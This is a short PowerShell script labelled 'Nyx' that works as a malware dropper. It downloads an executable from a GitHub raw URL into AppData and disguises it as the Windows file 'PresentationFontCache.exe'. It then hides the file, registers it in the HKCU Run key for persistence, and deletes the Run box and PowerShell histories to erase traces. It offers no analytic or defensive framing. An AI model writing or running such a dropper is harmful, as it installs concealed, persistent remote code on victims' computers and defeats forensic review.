# Nyx - E7AGL479

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "E7AGL479" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/E7AGL479/E7AGL479.exe -OutFile "$env:APPDATA\E7AGL479\E7AGL479.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\E7AGL479\E7AGL479.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\E7AGL479\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "E7AGL479" `
-Value "$env:APPDATA\E7AGL479\PresentationFontCache.exe -Ep Bypass"

# Run Nyx
$([Microsoft.Win32.Registry]::GetValue("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run", "E7AGL479", $null))

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
